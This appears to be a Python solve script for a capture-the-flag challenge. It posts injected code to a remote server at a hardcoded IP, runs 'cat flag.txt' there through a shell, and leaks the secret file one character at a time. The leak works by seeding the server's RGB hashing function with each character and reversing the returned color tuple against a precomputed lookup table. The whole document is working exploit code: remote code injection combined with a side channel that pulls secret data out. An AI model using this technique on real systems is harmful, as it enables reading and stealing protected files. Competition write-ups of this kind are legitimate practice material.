import string
import requests
import re
import random

def rgb_parse(seed, inp=""):
   random.seed(seed)
   inp = str(inp)
   randomizer = random.randint(100, 1000)
   total = 0
   for n in inp:
      n = ord(n)
      total += n+random.randint(1, 10)
   rgb = total*randomizer*random.randint(100, 1000)
   rgb = str(rgb%1000000000)
   r = int(rgb[0:3]) + 29
   g = int(rgb[3:6]) + random.randint(10, 100)
   b = int(rgb[6:9]) + 49
   r, g, b = r%256, g%256, b%256
   return (r, g, b)

lookup = {rgb_parse(i, "aaa"):i for i in range(256)}

flag = "ictf{"
valid = re.compile(r"\([0-9]{1,3}, [0-9]{1,3}, [0-9]{1,3}\)")

while flag[-1] != "}":
        payload = f"""import random
import subprocess
flag = subprocess.check_output("cat flag.txt", shell=True, text=True)
flag = flag.strip()
random.seed(ord(flag[{len(flag)}]))
return "aaa"
"""

        match = re.search(valid, requests.post("http://34.91.38.193/", data={"code" : payload}).text)

        match = match.group()[1:-1]
        match = tuple(map(int, match.split(", ")))
        flag += chr(lookup[match])
        print(flag)
